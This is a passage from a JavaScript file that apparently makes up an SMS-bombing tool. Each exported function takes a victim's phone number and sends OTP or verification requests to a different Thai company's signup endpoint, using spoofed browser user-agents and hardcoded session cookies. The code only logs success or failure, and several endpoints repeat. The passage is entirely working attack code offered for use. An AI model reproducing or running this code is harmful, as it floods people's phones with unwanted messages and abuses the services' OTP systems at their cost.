  const data = `ReturnUrl=%2F&UserName=${phone}&Displayname=asssdad+sadass&CityId=1&&Captcha=F9UR`;
  const headers = {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "x-requested-with": "XMLHttpRequest",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "cookie": ".AspNetCore.Antiforgery.9TtSrW0hzOs=CfDJ8AbF96Heci1NnsIpfhXCcZq_1dcnjr3wJH7IbyuvXx7JO98q0olmE5QQ09sRX3ts4f0snXBgp8hKG68ehlSJxRKG2BLY2Wj9z-AV6rmiU8RDNlEhHozm-R_ZGKSEbQSycbX455ffFuyBSw7fAUE-9M8; CHOBROD_SERVERID=051_30886; referrerCheckingGA=https://www.google.com/; _ga=GA1.2.684081299.1664700698; _gid=GA1.2.1610639645.1664700698; _gat_UA-88971742-1=1; sidchobrod=m08SOd7CyVuruAdw6iJ6fiZ9Sdm1V90G; usidchobrod=EENsATLoK7OnvSeYvnOuhOEJfl2zllCK; G_ENABLED_IDPS=google; _fbp=fb.1.1664700699743.423276722; GuildId=615af95c-99ca-48ba-bf8c-39a6638a708e; _ga_D11BPJ59QV=GS1.1.1664700697.1.1.1664700735.0.0.0"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api39 = async (phone) => {
  const url = `https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone=${phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=`;

  try {
    const response = await axios.get(url);
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api40 = async (phone) => {
  const url = "https://api.fairdee.co.th/profile/request-otp";
  const data = {
    username: phone,
    username_type: "phone",
    intent: "signup",
    is_email_otp: false
  };
  const headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "cookie": "mp_184c9deb723214f5772e9320157cb5b9_mixpanel=%7B%22distinct_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24device_id%22%3A%20%22183bbb5007ddf-0261f79d6d1bad-5771031-1fa400-183bbb5007e6f9%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; WZRK_G=a566c075343f4d118e2b0f35111f6f22; WZRK_S_69W-676-R46Z=%7B%22p%22%3A1%2C%22s%22%3A1665301546%2C%22t%22%3A1665301545%7D; _ga=GA1.3.837932271.1665301552; _gid=GA1.3.1240970639.1665301552; _gat=1; _gcl_au=1.1.1486581940.1665301553; _gat_gtag_UA_116460668_3=1; ajs_anonymous_id=578a9b90-fec5-409e-9b9e-60461e79d2a8; _fbp=fb.2.1665301553007.478015998"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api41 = async (phone) => {
  const url = "https://admin-api.24fix.tech/auth/otp/request";
  const data = { phoneNumber: phone };
  const headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api42 = async (phone) => {
  const url = "https://www.ctrueshop.com/member.php?page=25&type=9";
  const data = `tel1=${phone}&affiliate=2&social=`;
  const headers = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "cookie": "PHPSESSID=1po9v1nrrem5fr8co6urk37lv1; _gcl_au=1.1.867007754.1665302231; _ga=GA1.2.1978432786.1665302231; _gid=GA1.2.1842911343.1665302231; _gat_gtag_UA_19183081_1=1; __sdwc=0978bae8-1717-4f1b-9f1a-dcf9dce81fa8; rchatbox:checkCrossOriginWebdata=1665302236917"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api43 = async (phone) => {
  const url = `https://app.iship.cloud/api/ant/request-otp/${phone}`;
  const headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D"
  };

  try {
    const response = await axios.get(url, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api44 = async (phone) => {
  const url = `https://4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com/dev/request-otp/+66${phone.slice(1)}`;
  const headers = {
    "authority": "4k6hzpuupa.execute-api.ap-southeast-1.amazonaws.com",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
  };

  try {
    const response = await axios.get(url, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api45 = async (phone) => {
  const url = "https://www.ctrueshop.com/member.php?page=25&type=9";
  const data = `tel1=${phone}&affiliate=2&social=`;
  const headers = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "cookie": "PHPSESSID=1po9v1nrrem5fr8co6urk37lv1; _gcl_au=1.1.867007754.1665302231; _ga=GA1.2.1978432786.1665302231; _gid=GA1.2.1842911343.1665302231; _gat_gtag_UA_19183081_1=1; __sdwc=0978bae8-1717-4f1b-9f1a-dcf9dce81fa8; rchatbox:checkCrossOriginWebdata=1665302236917"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api46 = async (phone) => {
  const url = `https://bkk-api.ks-it.co/Vcode/register?country_code=66&phone=${phone}&sms_type=1&user_type=2&app_version=4.3.25&device_id=79722530562d973f&app_device_param=%7B%22os%22%3A%22Android%22%2C%22app_version%22%3A%224.3.25%22%2C%22model%22%3A%22A37f%22%2C%22os_ver%22%3A%225.1.1%22%2C%22ble%22%3A%220%22%7D&language=th&token=`;
  
  try {
    const response = await axios.get(url);
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api47 = async (phone) => {
  const url = "https://api.giztix.com/graphql";
  const data = {
    operationName: "OtpGeneratePhone",
    variables: {
      phone: `66${phone.slice(1)}`
    },
    query: "mutation OtpGeneratePhone($phone: ID!) {\n  otpGeneratePhone(phone: $phone) {\n    ref\n    __typename\n  }\n}\n"
  };
  
  const headers = {
    "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api48 = async (phone) => {
  const url = "https://trainflix-api.xeersoft.co.th/api/otpphone/register";
  const data = {
    numberphone: phone
  };

  const headers = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api49 = async (phone) => {
  const url = "https://dso.panggame.com/1/verify/send";
  const data = {
    verify_source: 1,
    verify_type: 1,
    phone: `${phone.slice(1)}`,
    areacode: "66"
  };
  
  const headers = {
    "content-type": "application/json;charset=UTF-8",
    "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
    "cookie": "_ga=GA1.1.1204499527.1666053101;_gcl_au=1.1.1227846426.1666053101;_fbp=fb.1.1666053101625.1278839242;_ga_2THGVDHQ7D=GS1.1.1666053101.1.1.1666053106.55.0.0;buttMsg=1666053125212"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};

export const api50 = async (phone) => {
  const url = "https://admin-api.24fix.tech/auth/otp/request";
  const data = { phoneNumber: phone };
  const headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
  };

  try {
    const response = await axios.post(url, data, { headers });
    console.log(`Request Success | ${response.status}`);
  } catch (error) {
    console.log(`Request Failed | ${error.response.status}`);
  }
};
